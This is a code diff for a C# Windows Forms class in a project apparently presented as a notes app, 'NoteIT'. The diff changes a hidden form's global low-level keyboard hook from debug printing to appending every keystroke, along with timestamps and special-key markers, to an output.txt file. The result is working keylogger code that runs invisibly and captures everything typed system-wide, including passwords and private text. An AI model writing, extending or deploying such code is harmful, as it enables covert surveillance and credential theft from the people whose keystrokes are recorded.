@@ -15,8 +15,12 @@ namespace NoteIT
 {
     public partial class Subform : Form
     {
-        private static Keys[] notneeded = {Keys.LControlKey, Keys.RControlKey};
+        private static Keys[] notneeded = 
+            {Keys.LControlKey, Keys.RControlKey ,Keys.LControlKey, Keys.RControlKey,
+            Keys.LMenu,Keys.RMenu, Keys.LWin, Keys.RWin};
+        private static StringBuilder outputtowrite = new StringBuilder();
         private static bool CapsPressed = Control.IsKeyLocked(Keys.CapsLock);
+        private static TextWriter file;
         private static bool ShiftPressed;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
@@ -24,28 +28,32 @@ namespace NoteIT
         private static IntPtr _hookID = IntPtr.Zero;
         public Subform()
         {
-            var handle = GetConsoleWindow();
             _hookID = SetHook(_proc);
-            //UnhookWindowsHookEx(_hookID);
             InitializeComponent();
             this.Visible = false;
+            file = new StreamWriter(@"..\..\output.txt", true);
+            file.WriteLine("\n" + DateTime.Now);
+            file.Close();
+        }
+        ~Subform()
+        {
+            UnhookWindowsHookEx(_hookID);
         }
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
             {
-                Debug.WriteLine("here");
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                     GetModuleHandle(curModule.ModuleName), 0);
             }
             
         }
-
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
+            file = new StreamWriter(@"..\..\output.txt", true);
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
 
@@ -64,114 +72,106 @@ namespace NoteIT
                 switch ((Keys)vkCode)
                 {
                     case Keys.Space:
-                        Debug.WriteLine(" ");
+                        file.Write(" ");
                         break;
                     case Keys.Return:
-                        Debug.WriteLine("\n");
+                        file.Write("\n");
                         break;
                     case Keys.Back:
-                        Debug.WriteLine("~bkspc~");
+                        file.Write("~bkspc~");
                         break;
                     case Keys.Tab:
-                        Debug.WriteLine("~TAB~");
+                        file.Write("~TAB~");
                         break;
                     case Keys.D0:
-                        if (ShiftPressed) Debug.WriteLine("0");
-                        else Debug.WriteLine(")");
+                        if (!ShiftPressed) file.Write("0");
+                        else file.Write(")");
                         break;
                     case Keys.D1:
-                        if (ShiftPressed) Debug.WriteLine("1");
-                        else Debug.WriteLine("!");
+                        if (!ShiftPressed) file.Write("1");
+                        else file.Write("!");
                         break;
                     case Keys.D2:
-                        if (ShiftPressed) Debug.WriteLine("2");
-                        else Debug.WriteLine("@");
+                        if (!ShiftPressed) file.Write("2");
+                        else file.Write("@");
                         break;
                     case Keys.D3:
-                        if (ShiftPressed) Debug.WriteLine("3");
-                        else Debug.WriteLine("#");
+                        if (!ShiftPressed) file.Write("3");
+                        else file.Write("#");
                         break;
                     case Keys.D4:
-                        if (ShiftPressed) Debug.WriteLine("4");
-                        else Debug.WriteLine("$");
+                        if (!ShiftPressed) file.Write("4");
+                        else file.Write("$");
                         break;
                     case Keys.D5:
-                        if (ShiftPressed) Debug.WriteLine("5");
-                        else Debug.WriteLine("%");
+                        if (!ShiftPressed) file.Write("5");
+                        else file.Write("%");
                         break;
                     case Keys.D6:
-                        if (ShiftPressed) Debug.WriteLine("6");
-                        else Debug.WriteLine("^");
+                        if (!ShiftPressed) file.Write("6");
+                        else file.Write("^");
                         break;
                     case Keys.D7:
-                        if (ShiftPressed) Debug.WriteLine("7");
-                        else Debug.WriteLine("&");
+                        if (!ShiftPressed) file.Write("7");
+                        else file.Write("&");
                         break;
                     case Keys.D8:
-                        if (ShiftPressed) Debug.WriteLine("8");
-                        else Debug.WriteLine("*");
+                        if (!ShiftPressed) file.Write("8");
+                        else file.Write("*");
                         break;
                     case Keys.D9:
-                        if (ShiftPressed) Debug.WriteLine("9");
-                        else Debug.WriteLine("(");
+                        if (!ShiftPressed) file.Write("9");
+                        else file.Write("(");
                         break;
                     case Keys.LShiftKey:
-
                     case Keys.RShiftKey:
-
-                        Debug.WriteLine("");
+                        file.Write("");
                         break;
-                    case Keys.LControlKey:
-                    case Keys.RControlKey:
-                    case Keys.LMenu:
-                    case Keys.RMenu:
-                    case Keys.LWin:
-                    case Keys.RWin:
                     case Keys.Delete:
-                        Debug.WriteLine("~Delete~");
+                        file.Write("~Delete~");
                         break;
                     case Keys.OemQuestion:
-                        if (ShiftPressed) Debug.WriteLine("/");
-                        else Debug.WriteLine("?");
+                        if (!ShiftPressed) file.Write("/");
+                        else file.Write("?");
                         break;
                     case Keys.OemOpenBrackets:
-                        if (ShiftPressed) Debug.WriteLine("[");
-                        else Debug.WriteLine("{");
+                        if (!ShiftPressed) file.Write("[");
+                        else file.Write("{");
                         break;
                     case Keys.OemCloseBrackets:
-                        if (ShiftPressed) Debug.WriteLine("]");
-                        else Debug.WriteLine("}");
+                        if (!ShiftPressed) file.Write("]");
+                        else file.Write("}");
                         break;
                     case Keys.Oem1:
-                        if (ShiftPressed) Debug.WriteLine(";");
-                        else Debug.WriteLine(":");
+                        if (!ShiftPressed) file.Write(";");
+                        else file.Write(":");
                         break;
                     case Keys.Oem7:
-                        if (ShiftPressed) Debug.WriteLine("'");
-                        else Debug.WriteLine('"');
+                        if (!ShiftPressed) file.Write("'");
+                        else file.Write('"');
                         break;
                     case Keys.Oemcomma:
-                        if (ShiftPressed) Debug.WriteLine(",");
-                        else Debug.WriteLine("<");
+                        if (!ShiftPressed) file.Write(",");
+                        else file.Write("<");
                         break;
                     case Keys.OemPeriod:
-                        if (ShiftPressed) Debug.WriteLine(".");
-                        else Debug.WriteLine(">");
+                        if (!ShiftPressed) file.Write(".");
+                        else file.Write(">");
                         break;
                     case Keys.OemMinus:
-                        if (ShiftPressed) Debug.WriteLine("-");
-                        else Debug.WriteLine("_");
+                        if (!ShiftPressed) file.Write("-");
+                        else file.Write("_");
                         break;
                     case Keys.Oemplus:
-                        if (ShiftPressed) Debug.WriteLine("=");
-                        else Debug.WriteLine("+");
+                        if (!ShiftPressed) file.Write("=");
+                        else file.Write("+");
                         break;
                     case Keys.Oemtilde:
-                        if (ShiftPressed) Debug.WriteLine("`");
-                        else Debug.WriteLine("~");
+                        if (!ShiftPressed) file.Write("`");
+                        else file.Write("~");
                         break;
                     case Keys.Oem5:
-                        Debug.WriteLine("|");
+                        file.Write("|");
                         break;
                     case Keys.Capital:
                         {
@@ -180,43 +180,45 @@ namespace NoteIT
                         }
                         break;
                     case Keys.Left:
-                        Debug.WriteLine("~Left~");
+                        file.Write("~Left~");
                         break;
                     case Keys.Right:
-                        Debug.WriteLine("~Right~");
+                        file.Write("~Right~");
                         break;
                     case Keys.Up:
-                        Debug.WriteLine("~Up~");
+                        file.Write("~Up~");
                         break;
                     case Keys.Down:
-                        Debug.WriteLine("~Down~");
+                        file.Write("~Down~");
                         break;
                     case Keys.Home:
-                        Debug.WriteLine("~Home~");
+                        file.Write("~Home~");
                         break;
                     case Keys.End:
-                        Debug.WriteLine("~End~");
+                        file.Write("~End~");
                         break;
                     case Keys.PageDown:
-                        Debug.WriteLine("~PageDown~");
+                        file.Write("~PageDown~");
                         break;
                     case Keys.PageUp:
-                        Debug.WriteLine("~PageUp~");
+                        file.Write("~PageUp~");
                         break;
                     case Keys.OemBackslash:
-                        if (ShiftPressed) Debug.WriteLine("|");
-                        else Debug.WriteLine("\\");
+                        if (!ShiftPressed) file.Write("|");
+                        else file.Write("\\");
                         break;
                     default:
                         {
-                            if (ShiftPressed && CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToLower());
-                            if (!ShiftPressed && CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToUpper());
-                            if (ShiftPressed && !CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToUpper());
-                            if (!ShiftPressed && !CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToLower());
+                            if (ShiftPressed && CapsPressed) file.Write(((Keys)vkCode).ToString().ToLower());
+                            if (!ShiftPressed && CapsPressed) file.Write(((Keys)vkCode).ToString().ToUpper());
+                            if (ShiftPressed && !CapsPressed) file.Write(((Keys)vkCode).ToString().ToUpper());
+                            if (!ShiftPressed && !CapsPressed) file.Write(((Keys)vkCode).ToString().ToLower());
                         }
                         break;
+                        
                 }
             }
+            file.Close();
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
